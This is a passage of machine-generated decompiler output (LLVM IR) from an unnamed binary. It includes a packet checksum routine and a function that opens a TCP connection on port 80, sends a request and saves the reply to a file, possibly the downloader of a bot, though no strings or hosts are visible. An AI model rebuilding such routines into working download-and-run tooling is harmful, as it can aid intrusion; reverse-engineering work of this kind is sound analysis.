dec_label_pc_10000ed0:                            ; preds = %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge, %dec_label_pc_10000e9c, %dec_label_pc_10000ea8
  %stack_var_-32.1 = phi i32 [ %v2_10000ec8, %dec_label_pc_10000ea8 ], [ 0, %dec_label_pc_10000e9c ], [ %v2_10000e70, %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge ]
  %v4_10000ed4 = sdiv i32 %stack_var_-32.1, 65536
  %v1_10000edc = urem i32 %stack_var_-32.1, 65536
  %v2_10000ee0 = add nsw i32 %v4_10000ed4, %v1_10000edc
  %v4_10000eec = sdiv i32 %v2_10000ee0, 65536
  %v2_10000ef4 = add nsw i32 %v4_10000eec, %v2_10000ee0
  %v2_10000f0017 = urem i32 %v2_10000ef4, 65536
  %v1_10000f0c = xor i32 %v2_10000f0017, 65535
  ret i32 %v1_10000f0c

; uselistorder directives
  uselistorder i32 %v2_10000ee0, { 1, 0 }
  uselistorder i32 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %v1_10000e88, { 0, 2, 1 }
  uselistorder i32 %v2_10000e70, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10000ed0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10000ea8, { 1, 0 }
  uselistorder label %dec_label_pc_10000e60, { 1, 0 }
}

define i32 @function_10000f30(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10000f30:
  %r11.global-to-local = alloca i32, align 4
  %stack_var_-4140 = alloca i32, align 4
  %stack_var_-5176 = alloca i32, align 4
  %stack_var_-5180 = alloca i32, align 4
  %stack_var_-5224 = alloca i32, align 4
  %stack_var_-5164 = alloca i32, align 4
  %stack_var_-5232 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10000f30 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10000f30, i32* %stack_var_-5232, align 4
  %v1_10000f5c = call i32 @function_100004f0(i32 %arg2)
  %v3_10000f64 = icmp eq i32 %v1_10000f5c, 0
  br i1 %v3_10000f64, label %dec_label_pc_10000f6c, label %dec_label_pc_10001504

dec_label_pc_10000f6c:                            ; preds = %dec_label_pc_10000f30
  %v2_10000f70 = icmp sgt i32 %arg3, 1
  br i1 %v2_10000f70, label %dec_label_pc_10000f98, label %dec_label_pc_10000f78

dec_label_pc_10000f78:                            ; preds = %dec_label_pc_10000f6c
  %v5_10000f8c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_1000cec0.22 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10000f94 = call i32 @function_1000885c()
  br label %dec_label_pc_10000f98

dec_label_pc_10000f98:                            ; preds = %dec_label_pc_10000f6c, %dec_label_pc_10000f78
  store i32 268439464, i32* @lr, align 4
  %v3_10000fa4 = call i32 @function_10007cbc(i32 2, i32 1, i32 0)
  %v4_10000fb8 = icmp eq i32 %v3_10000fa4, -1
  br i1 %v4_10000fb8, label %dec_label_pc_10000fc0, label %dec_label_pc_10000fe0

dec_label_pc_10000fc0:                            ; preds = %dec_label_pc_10000f98
  %v5_10000fd4 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1000cee4.25 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10000fdc = call i32 @function_1000885c()
  br label %dec_label_pc_10000fe0

dec_label_pc_10000fe0:                            ; preds = %dec_label_pc_10000f98, %dec_label_pc_10000fc0
  %v1_10000fe4 = add i32 %arg4, 4
  %v1_10000fe8 = inttoptr i32 %v1_10000fe4 to i32*
  %v2_10000fe8 = load i32, i32* %v1_10000fe8, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1000cf0c.27 to i32), i32* @r4, align 4
  %v5_10000ffc = inttoptr i32 %v2_10000fe8 to i8*
  %v6_10000ffc = call i32 @function_10006f7c(i8* %v5_10000ffc, i32 ptrtoint ([8 x i8]* @global_var_1000cf0c.27 to i32), i32 7, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10001004 = icmp eq i32 %v6_10000ffc, 0
  %v2_10001014 = load i32, i32* %v1_10000fe8, align 4
  br i1 %v3_10001004, label %dec_label_pc_1000100c, label %dec_label_pc_10001030

dec_label_pc_1000100c:                            ; preds = %dec_label_pc_10000fe0
  %v1_10001018 = add i32 %v2_10001014, 7
  %v2_1000101c = ptrtoint i32* %stack_var_-5164 to i32
  %v2_10001028 = inttoptr i32 %v1_10001018 to i8*
  %v3_10001028 = call i32 @function_10006eb8(i32 %v2_1000101c, i8* %v2_10001028)
  br label %dec_label_pc_1000104c

dec_label_pc_10001030:                            ; preds = %dec_label_pc_10000fe0
  %v2_1000103c = ptrtoint i32* %stack_var_-5164 to i32
  %v2_10001048 = inttoptr i32 %v2_10001014 to i8*
  %v3_10001048 = call i32 @function_10006eb8(i32 %v2_1000103c, i8* %v2_10001048)
  br label %dec_label_pc_1000104c

dec_label_pc_1000104c:                            ; preds = %dec_label_pc_1000100c, %dec_label_pc_10001030
  %v2_10001068.pre-phi = phi i32 [ %v2_1000101c, %dec_label_pc_1000100c ], [ %v2_1000103c, %dec_label_pc_10001030 ]
  %v2_10001084 = ptrtoint i32* %stack_var_-5224 to i32
  store i32 %v2_10001068.pre-phi, i32* @r3, align 4
  %v0_1000107065 = call i32 @function_10006ed8()
  %v2_1000107867 = icmp eq i32 %v0_1000107065, 0
  br i1 %v2_1000107867, label %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge, label %dec_label_pc_10001080

dec_label_pc_10001058:                            ; preds = %dec_label_pc_10001080
  %v1_1000105c = add i32 %storemerge570, 1
  store i32 %v2_10001068.pre-phi, i32* @r3, align 4
  %v0_10001070 = call i32 @function_10006ed8()
  %v2_10001078 = icmp ult i32 %v1_1000105c, %v0_10001070
  br i1 %v2_10001078, label %dec_label_pc_10001080, label %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge

dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge: ; preds = %dec_label_pc_1000104c, %dec_label_pc_10001058
  %storemerge5.lcssa = phi i32 [ 0, %dec_label_pc_1000104c ], [ %v1_1000105c, %dec_label_pc_10001058 ]
  %.pre29 = add i32 %storemerge5.lcssa, %v2_10001084
  %.pre30 = add i32 %.pre29, 60
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_1000109c

dec_label_pc_10001080:                            ; preds = %dec_label_pc_1000104c, %dec_label_pc_10001058
  %storemerge570 = phi i32 [ %v1_1000105c, %dec_label_pc_10001058 ], [ 0, %dec_label_pc_1000104c ]
  %v2_10001088 = add i32 %storemerge570, %v2_10001084
  %v1_1000108c = add i32 %v2_10001088, 60
  %v2_1000108c = inttoptr i32 %v1_1000108c to i8*
  %v3_1000108c = load i8, i8* %v2_1000108c, align 1
  %v3_10001094 = icmp eq i8 %v3_1000108c, 47
  br i1 %v3_10001094, label %dec_label_pc_1000109c, label %dec_label_pc_10001058

dec_label_pc_1000109c:                            ; preds = %dec_label_pc_10001080, %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge
  %storemerge564 = phi i32 [ %storemerge5.lcssa, %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge ], [ %storemerge570, %dec_label_pc_10001080 ]
  %v4_100010ac.pre-phi = phi i8* [ %.pre31, %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge ], [ %v2_1000108c, %dec_label_pc_10001080 ]
  store i8 0, i8* %v4_100010ac.pre-phi, align 1
  store i32 2, i32* %stack_var_-5180, align 4
  store i32 80, i32* @r3, align 4
  %v1_100010bc = call i32 @function_10007644(i32 80)
  store i32 268439764, i32* @lr, align 4
  %v1_100010d0 = call i32 @function_10007770(i32 %v2_10001068.pre-phi)
  %v4_100010e4 = icmp eq i32 %v1_100010d0, -1
  br i1 %v4_100010e4, label %dec_label_pc_100010ec, label %dec_label_pc_10001160

dec_label_pc_100010ec:                            ; preds = %dec_label_pc_1000109c
  store i32 268439800, i32* @lr, align 4
  %v2_100010f4 = call i32 @function_100077a4(i32 %v2_10001068.pre-phi, i32 -1)
  %v3_10001104 = icmp eq i32 %v2_100010f4, 0
  br i1 %v3_10001104, label %dec_label_pc_1000110c, label %dec_label_pc_1000112c

dec_label_pc_1000110c:                            ; preds = %dec_label_pc_100010ec
  %v5_10001120 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1000cf14.30 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10001128 = call i32 @function_1000885c()
  br label %dec_label_pc_1000112c

dec_label_pc_1000112c:                            ; preds = %dec_label_pc_100010ec, %dec_label_pc_1000110c
  %v2_10001130 = ptrtoint i32* %stack_var_-5176 to i32
  %v1_10001138 = add i32 %v2_100010f4, 16
  %v2_10001138 = inttoptr i32 %v1_10001138 to i32*
  %v3_10001138 = load i32, i32* %v2_10001138, align 4
  %v1_1000113c = inttoptr i32 %v3_10001138 to i32*
  %v2_1000113c = load i32, i32* %v1_1000113c, align 4
  store i32 %v2_1000113c, i32* %r11.global-to-local, align 4
  %v1_10001144 = add i32 %v2_100010f4, 12
  %v2_10001144 = inttoptr i32 %v1_10001144 to i32*
  %v3_10001144 = load i32, i32* %v2_10001144, align 4
  store i32 %v2_10001130, i32* @r3, align 4
  store i32 %v2_1000113c, i32* @r4, align 4
  store i32 %v3_10001144, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000115c.33 to i32), i32* @lr, align 4
  %v0_10001158 = call i32 @function_10006d8c()
  br label %dec_label_pc_10001168

dec_label_pc_10001160:                            ; preds = %dec_label_pc_1000109c
  store i32 %v1_100010d0, i32* %stack_var_-5176, align 4
  br label %dec_label_pc_10001168

dec_label_pc_10001168:                            ; preds = %dec_label_pc_1000112c, %dec_label_pc_10001160
  %v2_10001180.pre-phi = ptrtoint i32* %stack_var_-5180 to i32
  store i32 268439956, i32* @lr, align 4
  %v3_10001190 = call i32 @function_10007ba4(i32 %v3_10000fa4, i32 %v2_10001180.pre-phi, i32 16)
  %v3_10001198 = icmp eq i32 %v3_10001190, 0
  br i1 %v3_10001198, label %dec_label_pc_100011c0, label %dec_label_pc_100011a0

dec_label_pc_100011a0:                            ; preds = %dec_label_pc_10001168
  %v5_100011b4 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1000cf3c.34 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_100011bc = call i32 @function_1000885c()
  br label %dec_label_pc_100011c0

dec_label_pc_100011c0:                            ; preds = %dec_label_pc_10001168, %dec_label_pc_100011a0
  %v2_100011c8 = add i32 %v2_10001068.pre-phi, 1
  %v1_100011cc = add i32 %v2_100011c8, %storemerge564
  store i32 %v2_10001068.pre-phi, i32* %r11.global-to-local, align 4
  %v6_100011ec = call i32 @function_1000041c(i32 %v3_10000fa4, i32 ptrtoint ([276 x i8]* @global_var_1000cf64.36 to i32), i32 %v1_100011cc, i32 %v2_10001068.pre-phi)
  %v5_10001204 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_1000d078.37 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v1_1000120c = add i32 %arg4, 8
  %v1_10001210 = inttoptr i32 %v1_1000120c to i32*
  %v2_10001210 = load i32, i32* %v1_10001210, align 4
  store i32 268440100, i32* @lr, align 4
  %v3_10001220 = call i32 @function_10004ca0(i32 %v2_10001210, i32 ptrtoint ([3 x i8]* @global_var_1000d094.38 to i32))
  %v2_1000122c = ptrtoint i32* %stack_var_-4140 to i32
  br label %dec_label_pc_1000122c

dec_label_pc_1000122c:                            ; preds = %dec_label_pc_10001388, %dec_label_pc_100011c0
  store i32 268440132, i32* @lr, align 4
  %v4_10001240 = call i32 @function_10007c08(i32 %v3_10000fa4, i32 %v2_1000122c, i32 4096, i32 0)
  %tmp58 = icmp slt i32 %v4_10001240, 1
  br i1 %tmp58, label %dec_label_pc_100013a8, label %dec_label_pc_10001258

dec_label_pc_10001258:                            ; preds = %dec_label_pc_1000122c
  %v2_1000125c = icmp sgt i32 %v4_10001240, 4095
  br i1 %v2_1000125c, label %dec_label_pc_10001284.lr.ph, label %dec_label_pc_10001264

dec_label_pc_10001264:                            ; preds = %dec_label_pc_10001258
  %v2_1000126c = add i32 %v4_10001240, %v2_10001084
  %v3_10001274 = add i32 %v2_1000126c, 1084
  %v4_10001274 = inttoptr i32 %v3_10001274 to i8*
  store i8 0, i8* %v4_10001274, align 1
  br label %dec_label_pc_10001284.lr.ph

dec_label_pc_10001284.lr.ph:                      ; preds = %dec_label_pc_10001264, %dec_label_pc_10001258
  br label %dec_label_pc_10001284

dec_label_pc_10001284:                            ; preds = %dec_label_pc_10001284.lr.ph, %dec_label_pc_10001388
  %storemerge625 = phi i32 [ 0, %dec_label_pc_10001284.lr.ph ], [ %v1_1000138c, %dec_label_pc_10001388 ]
  %v2_10001290 = add i32 %storemerge625, %v2_1000122c
  store i32 ptrtoint ([5 x i8]* @global_var_1000d098.39 to i32), i32* @r4, align 4
  %v5_100012a4 = inttoptr i32 %v2_10001290 to i8*
  %v6_100012a4 = call i32 @function_10006f7c(i8* %v5_100012a4, i32 ptrtoint ([5 x i8]* @global_var_1000d098.39 to i32), i32 4, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_100012ac = icmp eq i32 %v6_100012a4, 0
  br i1 %v3_100012ac, label %dec_label_pc_100012b4, label %dec_label_pc_10001388

dec_label_pc_100012b4:                            ; preds = %dec_label_pc_10001284
  %v1_100012b8 = add i32 %storemerge625, 4
  %v2_1000137c18 = icmp slt i32 %v1_100012b8, %v4_10001240
  br i1 %v2_1000137c18, label %dec_label_pc_100012c4.lr.ph, label %dec_label_pc_100013a8

dec_label_pc_100012c4.lr.ph:                      ; preds = %dec_label_pc_100012b4
  %v1_100012d0 = add i32 %v3_10001220, 52
  %v2_100012d0 = inttoptr i32 %v1_100012d0 to i32*
  %v1_100012e0 = add i32 %v3_10001220, 16
  %v2_100012e0 = inttoptr i32 %v1_100012e0 to i32*
  %v1_100012e8 = add i32 %v3_10001220, 28
  %v2_100012e8 = inttoptr i32 %v1_100012e8 to i32*
  br label %dec_label_pc_100012c4

dec_label_pc_100012c4:                            ; preds = %dec_label_pc_100012c4.lr.ph, %dec_label_pc_10001368
  %storemerge721 = phi i32 [ %v1_100012b8, %dec_label_pc_100012c4.lr.ph ], [ %v1_1000136c, %dec_label_pc_10001368 ]
  %v3_100012d0 = load i32, i32* %v2_100012d0, align 4
  %v3_100012d4 = icmp eq i32 %v3_100012d0, 0
  br i1 %v3_100012d4, label %dec_label_pc_10001348, label %dec_label_pc_100012dc

dec_label_pc_100012dc:                            ; preds = %dec_label_pc_100012c4
  %v3_100012e0 = load i32, i32* %v2_100012e0, align 4
  store i32 %v3_100012e0, i32* %r11.global-to-local, align 4
  %v3_100012e8 = load i32, i32* %v2_100012e8, align 4
  %v2_100012ec = icmp ult i32 %v3_100012e0, %v3_100012e8
  br i1 %v2_100012ec, label %dec_label_pc_100012f4, label %dec_label_pc_10001324

dec_label_pc_100012f4:                            ; preds = %dec_label_pc_100012dc
  %v3_100012f8 = load i32, i32* %v2_100012e0, align 4
  store i32 %v3_100012f8, i32* %r11.global-to-local, align 4
  %v2_10001304 = add i32 %storemerge721, %v2_10001084
  %v1_10001308 = add i32 %v2_10001304, 1084
  %v2_10001308 = inttoptr i32 %v1_10001308 to i8*
  %v3_10001308 = load i8, i8* %v2_10001308, align 1
  %v3_10001310 = inttoptr i32 %v3_100012f8 to i8*
  store i8 %v3_10001308, i8* %v3_10001310, align 1
  %v0_10001314 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001314 = add i32 %v0_10001314, 1
  store i32 %v1_10001314, i32* %v2_100012e0, align 4
  br label %dec_label_pc_10001368

dec_label_pc_10001324:                            ; preds = %dec_label_pc_100012dc
  %v2_1000132c = add i32 %storemerge721, %v2_10001084
  %v1_10001330 = add i32 %v2_1000132c, 1084
  %v2_10001330 = inttoptr i32 %v1_10001330 to i8*
  %v3_10001330 = load i8, i8* %v2_10001330, align 1
  store i32 ptrtoint (i32* @global_var_10001344.40 to i32), i32* @lr, align 4
  %v4_10001340 = call i32 @function_10006b54(i8 %v3_10001330, i32 %v3_10001220, i32 %v2_1000132c)
  br label %dec_label_pc_10001368

dec_label_pc_10001348:                            ; preds = %dec_label_pc_100012c4
  %v2_10001350 = add i32 %storemerge721, %v2_10001084
  %v1_10001354 = add i32 %v2_10001350, 1084
  %v2_10001354 = inttoptr i32 %v1_10001354 to i8*
  %v3_10001354 = load i8, i8* %v2_10001354, align 1
  store i32 268440424, i32* @lr, align 4
  %v4_10001364 = call i32 @function_100066f4(i8 %v3_10001354, i32 %v3_10001220, i32 %v2_10001350)
  br label %dec_label_pc_10001368

dec_label_pc_10001368:                            ; preds = %dec_label_pc_10001324, %dec_label_pc_100012f4, %dec_label_pc_10001348
  %v1_1000136c = add i32 %storemerge721, 1
  %v2_1000137c = icmp slt i32 %v1_1000136c, %v4_10001240
  br i1 %v2_1000137c, label %dec_label_pc_100012c4, label %dec_label_pc_100013a8

dec_label_pc_10001388:                            ; preds = %dec_label_pc_10001284
  %v1_1000138c = add nuw nsw i32 %storemerge625, 1
  %v2_1000139c = icmp slt i32 %v1_1000138c, %v4_10001240
  br i1 %v2_1000139c, label %dec_label_pc_10001284, label %dec_label_pc_1000122c

dec_label_pc_100013a8:                            ; preds = %dec_label_pc_1000122c, %dec_label_pc_10001368, %dec_label_pc_100012b4
  %v2_100013b0 = load i32, i32* %v1_10001210, align 4
  %v6_100013cc = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_1000d0a0.41 to i32), i32 %arg2, i32 %v2_100013b0)
  %v1_10001434 = add i32 %v3_10001220, 52
  %v2_10001434 = inttoptr i32 %v1_10001434 to i32*
  %v1_10001444 = add i32 %v3_10001220, 16
  %v2_10001444 = inttoptr i32 %v1_10001444 to i32*
  %v1_1000144c = add i32 %v3_10001220, 28
  %v2_1000144c = inttoptr i32 %v1_1000144c to i32*
  br label %dec_label_pc_100013d0

dec_label_pc_100013d0:                            ; preds = %dec_label_pc_100014cc, %dec_label_pc_100013a8
  store i32 268440552, i32* @lr, align 4
  %v4_100013e4 = call i32 @function_10007c08(i32 %v3_10000fa4, i32 %v2_1000122c, i32 4096, i32 0)
  %tmp59 = icmp slt i32 %v4_100013e4, 1
  br i1 %tmp59, label %dec_label_pc_100014ec, label %dec_label_pc_100013fc

dec_label_pc_100013fc:                            ; preds = %dec_label_pc_100013d0
  %v2_10001400 = icmp sgt i32 %v4_100013e4, 4095
  br i1 %v2_10001400, label %dec_label_pc_10001428.lr.ph, label %dec_label_pc_10001408

dec_label_pc_10001408:                            ; preds = %dec_label_pc_100013fc
  %v2_10001410 = add i32 %v4_100013e4, %v2_10001084
  %v3_10001418 = add i32 %v2_10001410, 1084
  %v4_10001418 = inttoptr i32 %v3_10001418 to i8*
  store i8 0, i8* %v4_10001418, align 1
  br label %dec_label_pc_10001428.lr.ph

dec_label_pc_10001428.lr.ph:                      ; preds = %dec_label_pc_10001408, %dec_label_pc_100013fc
  br label %dec_label_pc_10001428

dec_label_pc_10001428:                            ; preds = %dec_label_pc_10001428.lr.ph, %dec_label_pc_100014cc
  %storemerge817 = phi i32 [ 0, %dec_label_pc_10001428.lr.ph ], [ %v1_100014d0, %dec_label_pc_100014cc ]
  store i32 %v3_10001220, i32* %stack_var_-5224, align 4
  %v3_10001434 = load i32, i32* %v2_10001434, align 4
  %v3_10001438 = icmp eq i32 %v3_10001434, 0
  br i1 %v3_10001438, label %dec_label_pc_100014ac, label %dec_label_pc_10001440

dec_label_pc_10001440:                            ; preds = %dec_label_pc_10001428
  %v3_10001444 = load i32, i32* %v2_10001444, align 4
  store i32 %v3_10001444, i32* %r11.global-to-local, align 4
  %v3_1000144c = load i32, i32* %v2_1000144c, align 4
  %v2_10001450 = icmp ult i32 %v3_10001444, %v3_1000144c
  br i1 %v2_10001450, label %dec_label_pc_10001458, label %dec_label_pc_10001488

dec_label_pc_10001458:                            ; preds = %dec_label_pc_10001440
  %v3_1000145c = load i32, i32* %v2_10001444, align 4
  store i32 %v3_1000145c, i32* %r11.global-to-local, align 4
  %v2_10001468 = add i32 %storemerge817, %v2_10001084
  %v1_1000146c = add i32 %v2_10001468, 1084
  %v2_1000146c = inttoptr i32 %v1_1000146c to i8*
  %v3_1000146c = load i8, i8* %v2_1000146c, align 1
  %v3_10001474 = inttoptr i32 %v3_1000145c to i8*
  store i8 %v3_1000146c, i8* %v3_10001474, align 1
  %v0_10001478 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001478 = add i32 %v0_10001478, 1
  %v3_1000147c = load i32, i32* %stack_var_-5224, align 4
  %v2_10001480 = add i32 %v3_1000147c, 16
  %v3_10001480 = inttoptr i32 %v2_10001480 to i32*
  store i32 %v1_10001478, i32* %v3_10001480, align 4
  br label %dec_label_pc_100014cc

dec_label_pc_10001488:                            ; preds = %dec_label_pc_10001440
  %v2_10001490 = add i32 %storemerge817, %v2_10001084
  %v1_10001494 = add i32 %v2_10001490, 1084
  %v2_10001494 = inttoptr i32 %v1_10001494 to i8*
  %v3_10001494 = load i8, i8* %v2_10001494, align 1
  store i32 ptrtoint (i32* @global_var_100014a8.42 to i32), i32* @lr, align 4
  %v4_100014a4 = call i32 @function_10006b54(i8 %v3_10001494, i32 %v3_10001220, i32 %v2_10001490)
  br label %dec_label_pc_100014cc

dec_label_pc_100014ac:                            ; preds = %dec_label_pc_10001428
  %v2_100014b4 = add i32 %storemerge817, %v2_10001084
  %v1_100014b8 = add i32 %v2_100014b4, 1084
  %v2_100014b8 = inttoptr i32 %v1_100014b8 to i8*
  %v3_100014b8 = load i8, i8* %v2_100014b8, align 1
  store i32 268440780, i32* @lr, align 4
  %v4_100014c8 = call i32 @function_100066f4(i8 %v3_100014b8, i32 %v3_10001220, i32 %v2_100014b4)
  br label %dec_label_pc_100014cc

dec_label_pc_100014cc:                            ; preds = %dec_label_pc_10001488, %dec_label_pc_10001458, %dec_label_pc_100014ac
  %v1_100014d0 = add nuw nsw i32 %storemerge817, 1
  %v2_100014e0 = icmp slt i32 %v1_100014d0, %v4_100013e4
  br i1 %v2_100014e0, label %dec_label_pc_10001428, label %dec_label_pc_100013d0

dec_label_pc_100014ec:                            ; preds = %dec_label_pc_100013d0
  store i32 268440820, i32* @lr, align 4
  %v1_100014f0 = inttoptr i32 %v3_10001220 to i16*
  %v2_100014f0 = call i32 @function_10004b54(i16* %v1_100014f0)
  store i32 ptrtoint ([3 x i8]* @global_var_100014fc.43 to i32), i32* @lr, align 4
  %v1_100014f8 = call i32 @function_100048e0(i32 %v3_10000fa4)
  %v0_10001500 = call i32 @function_1000885c()
  br label %dec_label_pc_10001504

dec_label_pc_10001504:                            ; preds = %dec_label_pc_10000f30, %dec_label_pc_100014ec
  %v0_1000151c = phi i32 [ %v1_10000f5c, %dec_label_pc_10000f30 ], [ %v0_10001500, %dec_label_pc_100014ec ]
  %v2_10001504 = load i32, i32* %stack_var_-5232, align 4
  store i32 %v2_10001504, i32* %r11.global-to-local, align 4
  ret i32 %v0_1000151c

; uselistorder directives
  uselistorder i32 %storemerge817, { 3, 0, 1, 2 }
  uselistorder i32 %v4_100013e4, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge721, { 3, 0, 1, 2 }
  uselistorder i32 %storemerge625, { 2, 0, 1 }
  uselistorder i32 %v4_10001240, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_1000122c, { 1, 0, 2 }
  uselistorder i32 %v3_10001220, { 11, 0, 1, 9, 3, 2, 10, 7, 4, 6, 5, 8 }
  uselistorder i32 %storemerge570, { 0, 2, 1 }
  uselistorder i32 %storemerge5.lcssa, { 1, 0 }
  uselistorder i32 %v1_1000105c, { 2, 1, 0 }
  uselistorder i32 %v2_10001068.pre-phi, { 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 2, 3, 1, 4, 5, 0, 6 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_10001504, { 1, 0 }
  uselistorder label %dec_label_pc_100014cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001428, { 1, 0 }
  uselistorder label %dec_label_pc_100013a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001368, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100012c4, { 1, 0 }
  uselistorder label %dec_label_pc_10001284, { 1, 0 }
  uselistorder label %dec_label_pc_100011c0, { 1, 0 }
  uselistorder label %dec_label_pc_10001168, { 1, 0 }
  uselistorder label %dec_label_pc_1000112c, { 1, 0 }
  uselistorder label %dec_label_pc_10001080, { 1, 0 }
  uselistorder label %dec_label_pc_10001064.dec_label_pc_1000109c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000104c, { 1, 0 }
  uselistorder label %dec_label_pc_10000fe0, { 1, 0 }
  uselistorder label %dec_label_pc_10000f98, { 1, 0 }
}

define i32 @function_10001520(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001520:
  %tmp36 = call i8 @__decompiler_undefined_function_2()
  %v3_10001560 = load i32, i32* @global_var_10010464.16, align 4
  %v3_10001580 = icmp eq i32 %v3_10001560, 1
  %v3_1000159016 = zext i8 %tmp36 to i32
  br i1 %v3_10001580, label %dec_label_pc_10001588, label %dec_label_pc_100015f8

dec_label_pc_10001588:                            ; preds = %dec_label_pc_10001520
  %v9_100015f0 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1000d0b8.44 to i32), i32 %arg2, i32 %v3_1000159016)
  br label %dec_label_pc_100016c0

dec_label_pc_100015f8:                            ; preds = %dec_label_pc_10001520
  %v9_100016bc = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_1000d0d8.46 to i32), i32 %arg2, i32 %v3_1000159016)
  br label %dec_label_pc_100016c0

dec_label_pc_100016c0:                            ; preds = %dec_label_pc_10001588, %dec_label_pc_100015f8
  %storemerge = phi i32 [ %v9_100016bc, %dec_label_pc_100015f8 ], [ %v9_100015f0, %dec_label_pc_10001588 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_1000159016, { 1, 0 }
  uselistorder label %dec_label_pc_100016c0, { 1, 0 }
}

define i32 @function_100016e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100016e4:
  %v5_1000171c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1000d108.47 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  ret i32 %v5_1000171c
}

define i32 @function_10001738(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001738:
  %v3_10001760 = icmp eq i32 %arg3, 1
  br i1 %v3_10001760, label %dec_label_pc_10001784, label %dec_label_pc_10001768

dec_label_pc_10001768:                            ; preds = %dec_label_pc_10001738
  %v5_1000177c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_1000d128.48 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_100017e4

dec_label_pc_10001784:                            ; preds = %dec_label_pc_10001738
  %v1_10001788 = add i32 %arg4, 4
  %v1_1000178c = inttoptr i32 %v1_10001788 to i32*
  %v2_1000178c = load i32, i32* %v1_1000178c, align 4
  store i32 %v2_1000178c, i32* @r3, align 4
  %v0_10001794 = call i32 @function_10006ed8()
  %tmp9 = icmp ult i32 %v0_10001794, 10
  br i1 %tmp9, label %dec_label_pc_100017c0, label %dec_label_pc_100017a4

dec_label_pc_100017a4:                            ; preds = %dec_label_pc_10001784
  %v5_100017b8 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_1000d140.50 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_100017e4

dec_label_pc_100017c0:                            ; preds = %dec_label_pc_10001784
  %v2_100017c8 = load i32, i32* %v1_1000178c, align 4
  %v5_100017e0 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1000d178.52 to i32), i32 %v2_100017c8, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_100017e4

dec_label_pc_100017e4:                            ; preds = %dec_label_pc_100017a4, %dec_label_pc_10001768, %dec_label_pc_100017c0
  %v0_100017f8 = phi i32 [ %v5_100017b8, %dec_label_pc_100017a4 ], [ %v5_1000177c, %dec_label_pc_10001768 ], [ %v5_100017e0, %dec_label_pc_100017c0 ]
  ret i32 %v0_100017f8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100017e4, { 2, 0, 1 }
}

define i32 @function_100017fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100017fc:
  %v3_10001824 = icmp eq i32 %arg3, 1
  br i1 %v3_10001824, label %dec_label_pc_10001894, label %dec_label_pc_1000182c

